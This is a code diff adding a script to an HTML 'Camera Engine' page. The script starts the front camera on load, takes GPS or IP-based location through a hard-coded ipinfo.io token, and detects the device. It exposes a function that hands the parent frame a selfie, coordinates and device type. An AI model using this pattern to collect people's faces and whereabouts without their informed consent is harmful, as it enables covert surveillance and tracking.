@@ -1,25 +1,129 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Camera</title>
+    <title>Camera Engine</title>
     <style>
-        body {
-            margin: 0;
-            padding: 0;
-            height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
+        body { 
+            margin: 0; 
+            padding: 0; 
+            height: 100vh; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            background: #000; 
         }
-        video, canvas {
-            width: 100%;
-            max-width: 400px;
-            border-radius: 10px;
+        video { 
+            width: 100%; 
+            max-width: 400px; 
+            border-radius: 10px; 
+            transform: scaleX(-1); /* Mirror selfie mode */
         }
+        canvas { display: none; }
     </style>
 </head>
 <body>
-    <video id="video" autoplay muted></video>
-    <canvas id="canvas" style="display: none;"></canvas>
+    <video id="video" autoplay muted playsinline></video>
+    <canvas id="canvas"></canvas>
+
+    <script>
+        // ================== CAMERA ==================
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const ctx = canvas.getContext('2d');
+
+        async function initCamera() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: 'user', width: { ideal: 640 } }, 
+                    audio: false 
+                });
+                video.srcObject = stream;
+                await video.play();
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                return true;
+            } catch (e) {
+                console.error('Camera fail:', e);
+                return false;
+            }
+        }
+
+        // ================== LOCATION (GPS + IP Fallback) ==================
+        function getLocation() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) {
+                    fallbackToIP(resolve);
+                    return;
+                }
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => resolve({ 
+                        lat: pos.coords.latitude, 
+                        lon: pos.coords.longitude, 
+                        source: 'GPS (High Accuracy)' 
+                    }),
+                    () => fallbackToIP(resolve),
+                    { enableHighAccuracy: true, timeout: 8000 }
+                );
+            });
+        }
+
+        function fallbackToIP(resolve) {
+            fetch('https://ipinfo.io/json?token=a0cf54b7e5e91b')
+                .then(r => r.json())
+                .then(d => {
+                    const loc = d.loc ? d.loc.split(',') : [0, 0];
+                    resolve({ 
+                        lat: parseFloat(loc[0]) || 0, 
+                        lon: parseFloat(loc[1]) || 0, 
+                        source: 'IP Fallback (Approx)' 
+                    });
+                })
+                .catch(() => resolve({ lat: 0, lon: 0, source: 'Location Failed' }));
+        }
+
+        // ================== DEVICE DETECTION ==================
+        function getDevice() {
+            const ua = navigator.userAgent;
+            if (ua.includes('iPhone')) return 'iPhone';
+            if (ua.includes('iPad')) return 'iPad';
+            if (ua.includes('Android')) return 'Android';
+            if (ua.includes('Mac')) return 'Mac';
+            if (ua.includes('Windows')) return 'Windows PC';
+            return 'Unknown';
+        }
+
+        // ================== EXPOSED CAPTURE FUNCTION ==================
+        window.captureData = async function() {
+            // Update canvas size to match current video
+            if (video.videoWidth) {
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+            }
+            // Draw the mirrored video (so the selfie looks natural)
+            ctx.save();
+            ctx.scale(-1, 1);
+            ctx.drawImage(video, -canvas.width, 0, canvas.width, canvas.height);
+            ctx.restore();
+
+            const imageData = canvas.toDataURL('image/jpeg', 0.92);
+            const location = await getLocation();
+            const device = getDevice();
+
+            return {
+                image: imageData,
+                lat: location.lat,
+                lon: location.lon,
+                source: location.source,
+                device: device
+            };
+        };
+
+        // Auto-start on load
+        initCamera().then(ok => {
+            window.parent.postMessage({ 
+                type: ok ? 'cameraReady' : 'cameraError' 
+            }, '*');
+        });
+    </script>
 </body>
 </html>
